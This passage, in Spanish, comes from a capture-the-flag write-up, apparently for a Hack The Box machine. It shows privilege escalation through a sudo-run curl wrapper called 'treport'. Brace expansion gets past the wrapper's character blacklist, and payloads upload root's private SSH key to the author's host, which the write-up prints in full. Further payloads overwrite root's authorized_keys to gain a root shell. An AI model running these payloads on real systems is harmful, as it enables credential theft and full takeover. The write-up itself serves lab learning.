        <span class=mtk5>except</span><span class=mtk1>:</span>
            <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'Wrong</span> <span class=mtk4>Input'</span><span class=mtk1>)</span>
            <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>)</span>
        <span class=mtk5>else</span><span class=mtk1>:</span>
            <span class=mtk5>if</span> <span class=mtk1>choice</span> <span class=mtk5>==</span> <span class=mtk6>1</span><span class=mtk1>:</span>
                <span class=mtk1>obj</span><span class=mtk1>.</span><span class=mtk8>create</span><span class=mtk1>()</span>
            <span class=mtk5>elif</span> <span class=mtk1>choice</span> <span class=mtk5>==</span> <span class=mtk6>2</span><span class=mtk1>:</span>
                <span class=mtk1>obj</span><span class=mtk1>.</span><span class=mtk8>list_files</span><span class=mtk1>()</span>
                <span class=mtk1>obj</span><span class=mtk1>.</span><span class=mtk8>read_file</span><span class=mtk1>()</span>
            <span class=mtk5>elif</span> <span class=mtk1>choice</span> <span class=mtk5>==</span> <span class=mtk6>3</span><span class=mtk1>:</span>
                <span class=mtk1>obj</span><span class=mtk1>.</span><span class=mtk8>download</span><span class=mtk1>()</span>
            <span class=mtk5>elif</span> <span class=mtk1>choice</span> <span class=mtk5>==</span> <span class=mtk6>4</span><span class=mtk1>:</span>
                <span class=mtk1>check</span> <span class=mtk5>=</span> <span class=mtk6>False</span>
            <span class=mtk5>else</span><span class=mtk1>:</span>
                <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'Wrong</span> <span class=mtk4>input.'</span><span class=mtk1>)</span>
</code></pre></div><p>Si leemos los cuatro métodos existentes:</p><ul><li><code>list_files</code> no parece vulnerable</li><li><code>read_file</code> parece que tiene un buen filtro para <code>../</code></li><li><code>create</code> también parece tener un buen filtro para <code>../</code></li><li><code>download</code> tiene una lista de caracteres no permitidos, pero también tiene un comando de sistema en el que se concatenan datos de entrada de usuario</li></ul><p>Claramente, el método más vulnerable es <code>download</code>. Vamos a echar un vistazo a los caracteres no permitidos:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>[</span><span class=mtk4>'`'</span><span class=mtk1>,</span> <span class=mtk4>';'</span><span class=mtk1>,</span> <span class=mtk4>'&amp;'</span><span class=mtk1>,</span> <span class=mtk4>'|'</span><span class=mtk1>,</span> <span class=mtk4>'&gt;'</span><span class=mtk1>,</span> <span class=mtk4>'&lt;'</span><span class=mtk1>,</span> <span class=mtk4>'?'</span><span class=mtk1>,</span> <span class=mtk4>"'"</span><span class=mtk1>,</span> <span class=mtk4>'@'</span><span class=mtk1>,</span> <span class=mtk4>'#'</span><span class=mtk1>,</span> <span class=mtk4>'$'</span><span class=mtk1>,</span> <span class=mtk4>'%'</span><span class=mtk1>,</span> <span class=mtk4>'^'</span><span class=mtk1>,</span> <span class=mtk4>'('</span><span class=mtk1>,</span> <span class=mtk4>')'</span><span class=mtk1>]</span>  
</code></pre></div><p>De hecho, quizás es más fácil si miramos qué caracteres podemos utilizar (sin contar letras y números):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>[</span><span class=mtk4>'{'</span><span class=mtk1>,</span> <span class=mtk4>'}'</span><span class=mtk1>,</span> <span class=mtk4>','</span><span class=mtk1>,</span> <span class=mtk4>'.'</span><span class=mtk1>,</span> <span class=mtk4>'['</span><span class=mtk1>,</span> <span class=mtk4>']'</span><span class=mtk1>,</span> <span class=mtk4>'-'</span><span class=mtk1>,</span> <span class=mtk4>'+'</span><span class=mtk1>,</span> <span class=mtk4>':'</span><span class=mtk1>,</span> <span class=mtk4>'"'</span><span class=mtk1>,</span> <span class=mtk4>'/'</span><span class=mtk1>,</span> <span class=mtk4>'*'</span><span class=mtk1>]</span>  
</code></pre></div><p>Nótese que no podemos usar espacios porque hay una expresión regular que busca cualquier espacio en blanco:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>res</span> <span class=mtk5>=</span> <span class="mtk8 mtku">bool</span><span class=mtk1>(</span><span class="mtk8 mtku">re</span><span class=mtk1>.</span><span class=mtk8>search</span><span class=mtk1>(</span><span class=mtk4>'</span><span class=mtk6>\\</span><span class=mtk4>s'</span><span class=mtk1>,</span> <span class=mtk1>ip</span><span class=mtk1>))</span>  
</code></pre></div><p>Vamos a ver qué podemos hacer con estos caracteres.</p><h2 id=escalada-de-privilegios-con-sudo>Escalada de privilegios con <code>sudo</code></h2><p>Como se mostró antes, el usuario <code>code</code> puede ejecutar <code>/usr/bin/treport</code> como <code>root</code> usando <code>sudo</code>. Por lo que todas las acciones que se ejecuten en este contexto se realizarán como <code>root</code>.</p><p>El programa <code>treport</code> utiliza <code>curl</code> para descargar reportes de amenazas. Lo podemos ver en el código fuente o poniendo <code>127.0.0.1</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>code@code</span>:<span class=code-blue>~</span>$ sudo /usr/bin/treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:3
Enter the IP/file_name:127.0.0.1
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
                                 Dload  Upload   Total   Spent    Left  Speed
100  2078  100  2078    0     0   405k      0 --:--:-- --:--:-- --:--:--  405k
</code></pre></div><p>Y se muestra la salida del comando <code>curl</code>. De hecho, podemos no introducir nada y ver un error de <code>curl</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>code@code</span>:<span class=code-blue>~</span>$ sudo /usr/bin/treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:3
Enter the IP/file_name:
curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information  
</code></pre></div><p>Incluso podemos ver el panel de ayuda de <code>curl</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>code@code</span>:<span class=code-blue>~</span>$ sudo /usr/bin/treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:3
Enter the IP/file_name:--help
Usage: curl [options...] &lt;url&gt;
     --abstract-unix-socket &lt;path&gt; Connect via abstract Unix domain socket  
     --alt-svc &lt;file name&gt; Enable alt-svc with this cache file
     --anyauth       Pick any authentication method
 -a, --append        Append to target file when uploading
     --basic         Use HTTP Basic Authentication
     --cacert &lt;file&gt; CA certificate to verify peer against
     --capath &lt;dir&gt;  CA directory to verify peer against
...
</code></pre></div><p>Teniendo en cuenta que podemos utilizar <code>{</code>, <code>}</code> y <code>,</code>, podemos utilizarlos como &ldquo;espacios&rdquo; porque así funciona en Bash.</p><p>Por ejemplo, este comando:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> {10.10.17.44,-T,/root/.ssh/id_rsa} -o /root/reports/threat_report_HH_MM_SS  
</code></pre></div><p>Es equivalente a:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.17.44 -T /root/.ssh/id_rsa -o /root/reports/threat_report_HH_MM_SS  
</code></pre></div><p>Con este <em>payload</em>, podemos transferir la clave privada SSH de <code>root</code> a nuestra máquina (<code>-T</code> se usa en <code>curl</code> para subir el contenido de un archivo con una petición PUT). Para ello, usamos <code>nc</code> para escuchar en el puerto 80 (HTTP) y ponemos el <em>payload</em> en <code>treport</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>code@code</span>:<span class=code-blue>~</span>$ sudo /usr/bin/treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:3
Enter the IP/file_name:{10.10.17.44,-T,/root/.ssh/id_rsa}
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
                                 Dload  Upload   Total   Spent    Left  Speed
100  2590    0     0  100  2590      0   1257  0:00:02  0:00:02 --:--:--  1257
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 80
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.11.126.
Ncat: Connection from 10.10.11.126:33912.
PUT /id_rsa HTTP/1.1
Host: 10.10.17.44
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 2590
Expect: 100-continue

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn  
NhAAAAAwEAAQAAAYEAxo4GzoC3j6jxx+7LbM8ik5O1GMOesA2aqI4rlfPTAsqm9+WgEOKo
+sZ1zqhtVlZuuIOmFDie+0EL5GtsIgOaFEtQZ1m3TxOK5zDrSaFO06SLIIu6qXH8fRuhp3
Y3h5e08o3/Kp5uSGhN+mBLMPB0qYXVP7twHbc2HYHaFBgPgreLf6W4uPmD/Zq6vaC/Q+5r
B6qvowOPysPNCUgZ7HQcDYXJt876aCyVlKdu0A0Amm80txSvthx+LNuMg3NeLFEYN9exYD
CcykRq1dch/tFJ/ej8sQ5y8c6AbUQAcckmDzGhBrlaPEDJ6H3NSEJrqeZmbvJ75P9bNoyQ
yUR7ukamgiSZNhHWugCApb96ZdxNia9q4YhrJMN1vz7aKSH0lvbin97o6sZgn3xh2Zcm+U
uskfHoguvNwYgyCxnIpAsZDRjhNG1R/1hrxJOmt80eheIPM6b417z5db+cBfxJPsAod+jh
qpP4QirNQN67+TFeRpGnZ5B8MBtGIgUL+rNUFTEHAAAFgHSyAcl0sgHJAAAAB3NzaC1yc2
EAAAGBAMaOBs6At4+o8cfuy2zPIpOTtRjDnrANmqiOK5Xz0wLKpvfloBDiqPrGdc6obVZW
briDphQ4nvtBC+RrbCIDmhRLUGdZt08Tiucw60mhTtOkiyCLuqlx/H0boad2N4eXtPKN/y
qebkhoTfpgSzDwdKmF1T+7cB23Nh2B2hQYD4K3i3+luLj5g/2aur2gv0Puaweqr6MDj8rD
zQlIGex0HA2FybfO+mgslZSnbtANAJpvNLcUr7YcfizbjINzXixRGDfXsWAwnMpEatXXIf
7RSf3o/LEOcvHOgG1EAHHJJg8xoQa5WjxAyeh9zUhCa6nmZm7ye+T/WzaMkMlEe7pGpoIk
mTYR1roAgKW/emXcTYmvauGIayTDdb8+2ikh9Jb24p/e6OrGYJ98YdmXJvlLrJHx6ILrzc
GIMgsZyKQLGQ0Y4TRtUf9Ya8STprfNHoXiDzOm+Ne8+XW/nAX8ST7AKHfo4aqT+EIqzUDe
u/kxXkaRp2eQfDAbRiIFC/qzVBUxBwAAAAMBAAEAAAGAUPVkLRsqvXbjbuQdKfajYI0fkE
NjFuHVJ9kgSHoslbzPq9CDHZ9tyyLUsjjWrBd9+dokA6a6nDP/h1mNs6jIUHINDLb2GVYc
kvvNVC5jl8RFvjV7HNAPZWu41DFNnwnqi+P+IQCMcxWkhexxfDjvOJgLRXtF0bf8Zrellf
/hgykXxipqUXHbsbI/ZkZ+9lHmbi/YgZ1YKhMALUKq31DQh2r/vuS0EXnsW7qRYl+K2W1y
jxvuMVEY2W2Ds618vpEpmO/KnN2QbQD67tGqKX4DuHiIoguHeYU6i5ypQJnS6vJ7AjjNwc
a7nHfsJhasYOfnRhm+6XW5uArX2swBAxoRc9aMmay688qP/Ga+UpOaLVX1pfuESjPjlbdY
TvxZqk0HQNowBmYx4LW71Ot7q8VQ7FdQVMsVTf491aiBWxLtJcAu59nKwjxjNLmPVr/G7t
3tlUbnZGjDWX3339X7fQS7J+TZzegknJjm14t/cphhJGESS/CcfZAroOIVLXDcwTURAAAA
wDG2cThFZxyeqzm5XslU6WMLytamPnD8I2FSTbVG7Y1FmVU87anYNScnQ8cdy/dgNPoD/E
jSsWmO7EDD3sQW1rk7YadmN58TFyXHw33tqRJkmgOfHT50a7txg2IrhJ7RxDSlLfNa8crX
QGTEPk9gTngbqMuB5cQjLJQzD3o0G+sfp4K8nlL3ME6Fi1ghq4m4YwqjnKkVVR7+G11eLc
JfBAZfM/gWkihEror0/nEgKmciHs23bSJGo+BwXKadXbWscQAAAMEA4kwybL8ps/SLm8S5
N+UxoqSDFp0ycQcS0fAvHwMRDSUahP/d2sfwKCY2EszHLRjF+BYLrGEvJB5GHH1hl+MX1E
d3Ufqd2279j9fJsJre4xpIGp7A6dfZk9ds70VfwkTHy0AnincGOVW7nw5mT4ZhukYcrWNs
lmHZG368yJgbIJa2YQy3yICqWIE65y+4B+nBr0IgBCk7m27aRKG6w6HVcaIPzEZYxqy3sz
b5T0bbfIuZowodtsQtpoc5W0xavZnLAAAAwQDgnaUcotAphCkv8xeQmeyluMRhUvu+/E9O
bQFOwkr+gpJ0vFdH7UFDOvCv4reh88XsK2NVfHom9xjI+6QsXGymxkUf4IhmCTVODoVpks
eGrfBd8Ri19zkiUCp39CRpVZCqzHabeYWsYIIRJ5XY4FIga5V00UOh3vomtQ5j8a1jCkZ+
JVpkJVJSBp4qQUMFMdYx3bj4NcNPnvmb+TW4mgCDt/urNA7pSQ3T1gXbmag9ezFqSmSzC2
a5BI6W1lTZzjUAAAAJcm9vdEBjb2RlAQI=
-----END OPENSSH PRIVATE KEY-----
</code></pre></div><p>Sin embargo, esta clave privada de SSH no funciona. Se podría transferir la <em>flag</em> <code>root.txt</code> de la misma manera.</p><p>Si queremos una <em>shell</em> como <code>root</code>, tenemos dos opciones ya que podemos escribir archivos mediante <code>curl</code> (permisos de escritura como <code>root</code>):</p><ol><li>Modificar el archivo <code>/etc/passwd</code> para cambiar la contraseña de <code>root</code></li><li>Subir una clave pública de SSH en <code>/root/.ssh/authorized_keys</code></li></ol><p>Este vez, elegiré la seguida opción. Para ello, tenemos que generar un par de claves SSH y exponer la pública con un servidor web:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ssh-keygen</span>
Generating public/private rsa key pair.
Enter file in which to save the key (~/.ssh/id_rsa): ./id_rsa  
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in ./id_rsa
Your public key has been saved in ./id_rsa.pub
The key fingerprint is:
SHA256:i1sUXxdZ0+4pw/Y7Tv0KW/DwqgFdCCZhJTmpJ32a6Pk
The key's randomart image is:
+---[RSA 3072]----+
|      ==+     .+o|
|     .++ . .  ..o|
|     o .. . o .. |
|    o o .+ o .  .|
|     + +S o +  ..|
|    . oo o   X .o|
|   . .. o . o B..|
|    o  o   . =.o.|
|     .E   ..o o++|
+----[SHA256]-----+

<span class=code-cyan>$</span> <span class=code-dark-green>python</span> -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
</code></pre></div><p>Luego, con <code>treport</code> podemos pedir la clave pública (<code>id_rsa.pub</code>) y guardarla en <code>/root/.ssh/authorized_keys</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>code@code</span>:<span class=code-blue>~</span>$ sudo /usr/bin/treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:3
Enter the IP/file_name:{10.10.17.44/id_rsa.pub,-o,/root/.ssh/authorized_keys}
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
                                 Dload  Upload   Total   Spent    Left  Speed
100   553  100   553    0     0   2323      0 --:--:-- --:--:-- --:--:--  2323
</code></pre></div><p>Finalmente, tenemos acceso como <code>root</code> mediante nuestra clave privada (<code>id_rsa</code>) y sin contraseña:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ssh</span> -i <span class=mtku>id_rsa</span> root@10.10.11.126  
root@code:~# cat root.txt
3eb081061035fcd241f3e389d991f146
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label=aside class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#enumeración-web>Enumeración web</a></li><li><a href=#falsificando-un-_token_-jwt>Falsificando un <em>token</em> JWT</a></li><li><a href=#explotación-de-_directory-path-traversal_>Explotación de <em>Directory Path Traversal</em></a></li><li><a href=#enumeración-del-sistema>Enumeración del sistema</a></li><li><a href=#ingeniería-inversa-sobre-treport>Ingeniería inversa sobre <code>treport</code></a></li><li><a href=#escalada-de-privilegios-con-sudo>Escalada de privilegios con <code>sudo</code></a></li></ul></nav></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a><div style=margin-top:8px><div><div><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>